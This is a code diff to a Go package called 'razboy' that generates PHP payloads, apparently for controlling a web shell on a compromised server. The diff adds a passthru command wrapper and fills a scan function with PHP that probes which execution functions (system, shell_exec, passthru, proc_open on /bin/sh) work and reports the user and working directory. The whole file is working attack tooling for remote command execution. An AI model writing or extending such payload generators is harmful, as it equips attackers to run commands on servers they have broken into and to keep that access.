@@ -1,5 +1,9 @@
 package razboy
 
+func _getPassthruCMD(cmd, letter string) string {
+	return "ob_start();passthru('" + cmd + "');$" + letter + "=ob_get_contents();ob_end_clean();"
+}
+
 func _getSystemCMD(cmd, letter string) string {
 	return "ob_start();system('" + cmd + "');$" + letter + "=ob_get_contents();ob_end_clean();"
 }
@@ -41,8 +45,10 @@ func CreateCMD(cmd, scope, method string) string {
 	switch method {
 	case "shell_exec":
 		shellCMD = _getShellExecCMD(shellCMD, "r")
-	case "proc":
+	case "proc_open":
 		shellCMD = _getProcOpenCMD(cmd, scope, "/bin/sh", "r")
+	case "passthru":
+		shellCMD = _getPassthruCMD(shellCMD, "r")
 	default:
 		shellCMD = _getSystemCMD(shellCMD, "r")
 	}
@@ -95,7 +101,12 @@ func CreateDelete(scope string) string {
 }
 
 func CreateScan() string {
-	return ``
+	return `ob_start();system("echo 1;");$r["S"]["sy"]=trim(ob_get_contents());ob_end_clean();
+$r["S"]["sh"]=trim(shell_exec("echo 1;"));$r["I"]["w"]=trim(shell_exec("whoami;"));$r["I"]["p"]=trim(shell_exec("pwd;"));
+ob_start();passthru("echo 1;");$r["S"]["pa"]=trim(ob_get_contents());ob_end_clean();
+$opt=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe', 'w'));$proc=proc_open("/bin/sh", $opt, $pipes, "./");
+if(is_resource($proc)){fwrite($pipes[0], "echo 1;");fclose($pipes[0]);$s=stream_get_contents($pipes[1]);$e=stream_get_contents($pipes[2]);proc_close($proc);if($e===""){$r["S"]["pr"]=trim($s);}}
+$r=json_encode($r);`
 }
 
 func CreateAnswer(method, parameter string) string {
